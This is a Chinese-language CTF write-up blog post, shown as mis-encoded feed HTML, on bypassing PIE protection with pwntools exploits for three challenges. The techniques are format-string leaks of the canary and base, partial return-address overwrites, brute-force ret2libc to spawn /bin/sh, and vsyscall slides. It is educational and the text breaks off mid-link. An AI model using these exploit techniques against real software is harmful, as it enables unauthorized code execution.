      <link href="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/"/>
      <url>/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="PIEä¿æŠ¤"><a href="#PIEä¿æŠ¤" class="headerlink" title="PIEä¿æŠ¤"></a>PIEä¿æŠ¤</h1><h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>å‚è€ƒï¼š<a class="link" href="https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq+W5q5Mf+bD#toc-0">https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><font size="4" color="red">pieä¿æŠ¤ç®€å•æ¥è¯´å°±æ˜¯ç¨‹åºæ¯æ¬¡è½½å…¥å†…å­˜çš„åœ°å€éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œåœ°å€æ˜¯éšæœºçš„</font></p><ul><li>ä»idaæ¥çœ‹ï¼Œåœ°å€åŸºæœ¬éƒ½æ˜¯<strong>å››ä½æ•°</strong>ï¼Œå¦‚ä¸‹ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../ida%E7%9C%8Bpie.bmp"></p><ul><li>å·®åˆ«è¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨è¿™äº›åœ°å€æ“ä½œï¼Œè¦å…ˆå¯»æ‰¾åˆ°pieçš„åŸºåœ°å€ï¼Œidaç»™å‡ºæ¥çš„åªæ˜¯åç§»åœ°å€ã€‚</li></ul><p><font size="4" color="red">ç¨‹åºçš„å®é™…è¿è¡Œåœ°å€ &#x3D; ç¨‹åºåŠ è½½åŸºå€ + ç¨‹åºåç§»åœ°å€</font></p><ul><li><fron color="red">æ³¨æ„ï¼šå³ä½¿å¼€å¯äº†pieï¼ŒçœŸå®åœ°å€å’Œidaä¸­æ‰€çœ‹åˆ°çš„åç§»åœ°å€çš„æœ«ä¸‰ä½æ•°å­—è‚¯å®šè¿˜æ˜¯ä¸€æ ·çš„ï¼Œè¿™æ˜¯ç”±äºå†…å­˜é¡µå¯¹å…¶çš„åŸç†ã€‚</fron></li></ul><h2 id="å…³äºå¼€å¯pieçš„gdbè°ƒè¯•"><a href="#å…³äºå¼€å¯pieçš„gdbè°ƒè¯•" class="headerlink" title="å…³äºå¼€å¯pieçš„gdbè°ƒè¯•"></a>å…³äºå¼€å¯pieçš„gdbè°ƒè¯•</h2><ul><li><strong>æŒ‡ä»¤</strong>ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(åç§»åœ°å€) <span class="comment"># åç§»åœ°å€ä»idaçœ‹</span></span><br></pre></td></tr></table></figure></div><ul><li>æ³¨æ„ç¨‹åºè¦å…ˆrunèµ·æ¥ï¼Œæ‰å¯ä»¥æ‰“æ–­ç‚¹</li></ul><h1 id="å…·ä½“é¢˜ç›®"><a href="#å…·ä½“é¢˜ç›®" class="headerlink" title="å…·ä½“é¢˜ç›®"></a>å…·ä½“é¢˜ç›®</h1><h2 id="1-æ·±è‚²æ¯-2021-find-flag-æ ¼å¼åŒ–å­—ç¬¦ä¸²-pie"><a href="#1-æ·±è‚²æ¯-2021-find-flag-æ ¼å¼åŒ–å­—ç¬¦ä¸²-pie" class="headerlink" title="1.[æ·±è‚²æ¯ 2021]find_flag(æ ¼å¼åŒ–å­—ç¬¦ä¸²-pie)"></a>1.<strong>[æ·±è‚²æ¯ 2021]find_flag</strong>(æ ¼å¼åŒ–å­—ç¬¦ä¸²-pie)</h2><p><a class="link" href="https://www.nssctf.cn/problem/774">é¢˜ç›®åœ°å€ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="/../checksec.bmp"></p><ul><li><strong>ä¿æŠ¤å…¨å¼€ç›´æ¥çœ‹ida</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p><ul><li><strong>å¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå…ˆæ³„éœ²canaryå’ŒpieåŸºåœ°å€ï¼Œç„¶åæ ˆæº¢å‡ºåˆ°åé—¨å‡½æ•°å°±å¯ä»¥äº†</strong> (æ­¤é¢˜æœ‰åé—¨å‡½æ•°)</li></ul><p><font size="5" color="red"><strong>gdbè°ƒè¯•æŸ¥æ‰¾æ³„éœ²åç§»</strong></font></p><ul><li>åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é‚£é‡Œä¸‹æ–­ç‚¹ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p><ul><li>å…ˆè®©ç¨‹åºstartï¼Œç„¶åå¦‚ä¸Šé¢ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ ˆç»“æ„</li><li><strong>rbpä¸Šæ–¹çš„å°±æ˜¯canary</strong>, è·ç¦»rspåç§»æ˜¯11ï¼Œçœ‹æœ€å·¦ä¾§ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œ0xbï¼Œå†åŠ ä¸Š6ä¸ªå¯„å­˜å™¨(64ä½),åç§»åœ°å€æ˜¯17</li><li>å¦‚ä½•æ³„éœ²pieåœ°å€ï¼Œæˆ‘ä»¬è¦å¾—åˆ°ä¸€ä¸ª<strong>æ—¢å¯ä»¥åœ¨idaä¸­å¯ä»¥æŸ¥çœ‹åç§»çš„åœ°å€ï¼Œä¹Ÿå¯ä»¥æ³„éœ²å‡ºå…¶çœŸå®åœ°å€çš„åœ°æ–¹</strong>ï¼Œ æ­£å¦‚ä¸‹æ–¹,åç§»ä½0x146fçš„åœ°æ–¹,æ³„éœ²è¿™ä¸ªåœ°æ–¹çš„åœ°å€ï¼Œå‡å»0x146fï¼Œå°±å¯ä»¥å¾—åˆ°pieçš„åŸºåœ°å€äº†ã€‚</li><li><font color="red">æ³¨æ„ï¼šROPgadgetçœ‹åˆ°çš„åœ°å€ä¹Ÿåªæ˜¯åç§»åœ°å€ï¼Œè¦åŠ ä¸Špieçš„åŸºåœ°å€åæ‰å¯ä»¥ä½¿ç”¨ï¼š</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../ROPgadget.bmp"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28406</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canaryå’ŒpieåŸºåœ°å€</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hi! What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%17$p-%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you, &quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x146F</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]pie_base = <span class="subst">&#123;<span class="built_in">hex</span>(pie_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ˆæº¢å‡ºgetflag</span></span><br><span class="line">getflag = pie_base + <span class="number">0x01231</span></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Anything else? &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h6 id><a href="#" class="headerlink" title></a></h6><h2 id="2-linkctf-2018-7-babypie"><a href="#2-linkctf-2018-7-babypie" class="headerlink" title="2.linkctf_2018.7_babypie"></a>2.linkctf_2018.7_babypie</h2><p><a class="link" href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="/../pie2-1.bmp"></p><ul><li><strong>é€šè¿‡printfé‡åˆ°\x00æ‰ä¼šåœæ­¢è¾“å‡ºçš„ç‰¹æ€§ï¼Œä»è€Œæ³„éœ²canary</strong></li><li><font color="red">ä½†æ˜¯æ­¤æ—¶æ— æ³•æ³„éœ²å‡ºpieçš„åŸºåœ°å€äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ— æ³•ä¿®æ”¹ret_addressäº†å—ï¼Ÿå…¶å®ä¸ç„¶</font></li></ul><p>ä¹‹å‰è¯´è¿‡ï¼Œç”±äºé¡µå¯¹å…¶çš„æœºåˆ¶ï¼Œå³ä½¿å¼€å¯äº†pieï¼Œå…¶æœ«ä¸‰ä½16è¿›åˆ¶æ•°å­—ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ­£æ˜¯å› ä¸ºè¿™ä¸ªï¼Œ**æ‰€ä»¥è¿”å›åœ°å€å’Œåé—¨å‡½æ•°çš„åœ°å€åº”è¯¥åªæœ‰æœ«å››ä½ä¸åŒ(è¿æ°”æœ€å·®çš„æƒ…å†µä¸‹)**ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹æœ«å››ä½å°±å¯ä»¥retåˆ°åé—¨å‡½æ•°ï¼Œä»è€Œgetshellã€‚</p><ul><li>æ­¤é¢˜ç›®å°±æ˜¯å¦‚æ­¤ï¼Œä½†æ˜¯åªéœ€è¦ä¿®æ”¹æœ«ä¸¤ä½å°±å¯ä»¥getshell</li></ul><p><font size="4"><strong>gdb è°ƒè¯•ï¼Œç”»æ¡†éƒ¨åˆ†å…¶å®å°±æ˜¯mainå‡½æ•°ç»“æŸåçš„è¿”å›åœ°å€ï¼Œå‘ç°åç§»æ˜¯0xa6a</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/../pie2-2.bmp"></p><p><strong><font size="4">idaä¸­system(â€œ&#x2F;bin&#x2F;shâ€)çš„åœ°å€åç§»æ˜¯0xa42ï¼Œåªæœ‰åä¸¤ä½ä¸åŒï¼Œä¿®æ”¹åä¸¤ä½å³å¯</font></strong></p><p><img lazyload src="/images/loading.svg" data-src="/../pie2-3.bmp"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26786</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x25</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell = 0x00A3E</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h4><p>å¦‚æœæœ‰å¤šä½ä¸åŒï¼Œè€Œæˆ‘ä»¬åˆåªèƒ½é€å­—èŠ‚æ›´æ”¹ï¼Œæœ‰æ—¶å°±éœ€è¦è‡ªå·±å†™è„šæœ¬çˆ†ç ´äº†</p><h2 id="3-Basectf-week3-PIE-çˆ†ç ´è¿”å›åœ°å€"><a href="#3-Basectf-week3-PIE-çˆ†ç ´è¿”å›åœ°å€" class="headerlink" title="3.Basectf-week3-PIE(çˆ†ç ´è¿”å›åœ°å€)"></a>3.Basectf-week3-PIE(çˆ†ç ´è¿”å›åœ°å€)</h2><p><a class="link" href="https://www.basectf.fun/">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="/../3-1.bmp"></p><ul><li>å‘ç°ä¸»å‡½æ•°å°±è¿™äº›ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ³„éœ²libcï¼Œè·å¾—systemå‡½æ•°,æ‰€éœ€çš„gadgetã€‚</li><li>ä½†æ˜¯æˆ‘ä»¬æ— æ³•åƒåŸºæœ¬çš„ret2libcä¸€æ ·retåˆ°mainå‡½æ•°ï¼Œé‚£ä¹ˆå¦‚ä½•ä¿®æ”¹å‘¢ï¼Ÿçœ‹ä¸‹é¢çš„è°ƒè¯•ï¼š</li></ul><h4 id="gdbè°ƒè¯•ï¼š"><a href="#gdbè°ƒè¯•ï¼š" class="headerlink" title="gdbè°ƒè¯•ï¼š"></a>gdbè°ƒè¯•ï¼š</h4><h5 id="1-å¡«æ»¡æ ˆç©ºé—´ï¼ŒæŸ¥çœ‹ret-address"><a href="#1-å¡«æ»¡æ ˆç©ºé—´ï¼ŒæŸ¥çœ‹ret-address" class="headerlink" title="1.å¡«æ»¡æ ˆç©ºé—´ï¼ŒæŸ¥çœ‹ret_address"></a>1.å¡«æ»¡æ ˆç©ºé—´ï¼ŒæŸ¥çœ‹ret_address</h5><p><img lazyload src="/images/loading.svg" data-src="/../3-2.bmp"></p><ul><li>å¦‚å›¾ï¼Œè¿”å›åœ°å€æ˜¯__libc_start_main+128ï¼ŒæŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•æ¥è¯´ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªpie+åç§»çš„åœ°å€ï¼Œæˆ‘ä»¬ä¿®æ”¹æœ«ä¸¤å­—èŠ‚å°±å¯ä»¥è¿”å›åˆ°mainå‡½æ•°ï¼Œç„¶åé€šè¿‡æ³„éœ²çš„åœ°å€è®¡ç®—å‡ºpieåŸºåœ°å€ï¼Œè¿›è¡Œå…¶ä»–æ“ä½œã€‚</li><li>ä½†æ˜¯è¿™é‡Œä¸æ˜¯ï¼Œä½†æ˜¯éš¾é“å°±ä¸è¡Œäº†å—ï¼Ÿå…¶å®ä¸ç„¶ï¼Œ__libc_start_mainå‡½æ•°é™„è¿‘ä¹Ÿæœ‰gadgetå¯ä»¥ä½¿æˆ‘ä»¬è¿”å›mainå‡½æ•°ï¼Œå¯ä»¥è‡ªå·±ç”¨telescopeå»æ…¢æ…¢æ‰¾ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ç›´æ¥çˆ†ç ´ã€‚</li><li>å…¶å®ä½ è¦çŸ¥é“ï¼Œè¿™é¢˜ç›®è‚¯å®šæ˜¯ä¿®æ”¹æœ«å­—èŠ‚å¯ä»¥è¿”å›mainå‡½æ•°çš„ï¼Œä¸ç„¶å°±å†™ä¸å‡ºæ¥äº†ã€‚</li></ul><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›¿æ¢ä¸º process æˆ– remote</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;challenge.basectf.fun&quot;, 20961)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):  <span class="comment"># 0x00 åˆ° 0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Trying p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">    p = process(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># æ¯æ¬¡å¾ªç¯éƒ½éœ€è¦é‡æ–°åˆ›å»ºè¿›ç¨‹</span></span><br><span class="line">    payload = cyclic(<span class="number">0x100</span> + <span class="number">8</span>) + p8(i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = p.recvuntil(<span class="string">&quot;you said &quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recv())</span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            libc_start_main = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - i + <span class="number">0xc0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] Correct p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] libc_start_main: <span class="subst">&#123;<span class="built_in">hex</span>(libc_start_main)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="comment"># åç»­çš„æ”»å‡»é€»è¾‘</span></span><br><span class="line">            base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">            system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">            bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">            pop_rdi_ret = base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">            ret = base + <span class="number">0x0000000000029139</span></span><br><span class="line"></span><br><span class="line">            payload = cyclic(<span class="number">0x108</span>) + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># æ‰¾åˆ°æ­£ç¡®çš„å€¼åé€€å‡ºå¾ªç¯</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p8 value <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> failed.&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure></div><ul><li>æ•ˆæœï¼šåœ¨å‡ºç°è¾“å‡ºåœæ­¢çš„æ—¶å€™å°±è¯´æ˜é‚£ä¸ªæ•°å­—æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºæ­¤æ—¶ä½ å·²ç»è¿œç¨‹æ§åˆ¶æœåŠ¡å™¨äº†ï¼Œç­‰å¾…ç€ä½ è¾“å‡ºæŒ‡ä»¤ã€‚</li><li>0xc0å¯¹åº”çš„æ˜¯__libc_start_mainçš„åœ°å€ã€‚</li><li>é¢˜ç›®ä¸­æ²¡æœ‰ç›¸åº”çš„gadget,ä½†æ˜¯libc.soæ–‡ä»¶é‡Œé¢ä¹Ÿæœ‰gadgetï¼Œé€šè¿‡libc_base+åç§»ä¹Ÿå¯ä»¥ä½¿ç”¨</li></ul><h1 id="vsyscallç»•è¿‡"><a href="#vsyscallç»•è¿‡" class="headerlink" title="vsyscallç»•è¿‡"></a>vsyscallç»•è¿‡</h1><p>å‚è€ƒæ–‡ç« :<a class="link" href="https://blog.csdn.net/FUCKING12/article/details/127395040">vsyscallæ»‘æ¢¯ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>åœ¨å¼€å¯PIEçš„æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ²¡æ³•<code>æ³„éœ²pie</code>æˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™é‡Œä»‹ç»ä¸€ä¸‹æ–°çš„ä¸œè¥¿ï¼š<code>vsyscall</code></li><li><del>å¼•è‡ªgpt</del></li></ul><blockquote><p><code>vsyscall</code> æ˜¯ Linux å†…æ ¸ä¸­ç”¨äºå®ç°æŸäº›ç³»ç»Ÿè°ƒç”¨çš„ä¸€ç§æœºåˆ¶ã€‚å®ƒæä¾›äº†ä¸€ç§éå¸¸é«˜æ•ˆçš„æ–¹å¼æ¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œä¸»è¦ç”¨äºä¼˜åŒ–ä¸€äº›å¸¸è§çš„ç³»ç»Ÿè°ƒç”¨çš„æ€§èƒ½ã€‚ä¸ºäº†æ›´å¥½åœ°ç†è§£ <code>vsyscall</code>ï¼Œæˆ‘ä»¬éœ€è¦ä» Linux ç³»ç»Ÿè°ƒç”¨çš„å®ç°å’Œä¼˜åŒ–è§’åº¦æ¥æ¢è®¨ã€‚</p><h3 id="ç³»ç»Ÿè°ƒç”¨ç®€ä»‹"><a href="#ç³»ç»Ÿè°ƒç”¨ç®€ä»‹" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨ç®€ä»‹"></a>ç³»ç»Ÿè°ƒç”¨ç®€ä»‹</h3><p>åœ¨ Linux ä¸­ï¼Œç”¨æˆ·ç¨‹åºé€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰æ¥è¯·æ±‚å†…æ ¸æœåŠ¡ã€‚æ­£å¸¸çš„ç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹é€šå¸¸æ¶‰åŠç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚æ¯å½“ç”¨æˆ·ç¨‹åºéœ€è¦è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå®ƒä¼šè§¦å‘ä¸€ä¸ªè½¯ä»¶ä¸­æ–­ï¼ˆå¦‚ <code>int 0x80</code> æˆ– <code>syscall</code> æŒ‡ä»¤ï¼‰ï¼Œä»è€Œè¿›å…¥å†…æ ¸æ€ã€‚</p></blockquote><p><img lazyload src="/images/loading.svg" data-src="/../1324469efcd1c57cda1b98b358877131.png" alt="è¿™å°±æ˜¯é‚£å››ä¸ªå‡½æ•°"></p><ul><li>è¿™ä¸‰éƒ¨åˆ†å°±æ˜¯vsyscallçš„å‡½æ•°çš„è°ƒç”¨äº†ï¼Œè¿ç”¨syscallè¿›è¡Œå†…æ ¸è¯·æ±‚ï¼Œæœ€året</li><li>ä¸»è¦åˆ†ä¸ºä¸‹é¢ä¸‰ç§æ“ä½œ</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (vsyscall_nr) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="comment">/* this decodes regs-&gt;di and regs-&gt;si on its own */</span></span><br><span class="line">ret = __x64_sys_gettimeofday(regs);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">/* this decodes regs-&gt;di on its own */</span></span><br><span class="line">ret = __x64_sys_time(regs);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">/* while we could clobber regs-&gt;dx, we didn&#x27;t in the past... */</span></span><br><span class="line">orig_dx = regs-&gt;dx;</span><br><span class="line">regs-&gt;dx = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* this decodes regs-&gt;di, regs-&gt;si and regs-&gt;dx on its own */</span></span><br><span class="line">ret = __x64_sys_getcpu(regs);</span><br><span class="line">regs-&gt;dx = orig_dx;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>vsyscallçš„åœ°å€æ˜¯ä¸ä¼šå˜çš„ï¼Œé€šå¸¸æ˜¯<code>0xffffffffff600000</code><mark></mark></mark></li><li>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†<code>vsyscall</code>å½“ä½œ<code>ret</code>æ¥è¿ç”¨ï¼Œå³<code>vsyscallæ»‘æ¢¯</code></li></ul><h2 id="2024DSBCTF-ctfshow"><a href="#2024DSBCTF-ctfshow" class="headerlink" title="2024DSBCTF(ctfshow)"></a>2024DSBCTF(ctfshow)</h2><p>é¢˜ç›®é“¾æ¥ï¼š<a class="link" href="https://ctf.show/challenges#CheckIn-4486">this <i class="fa-regular fa-arrow-up-right-from-square 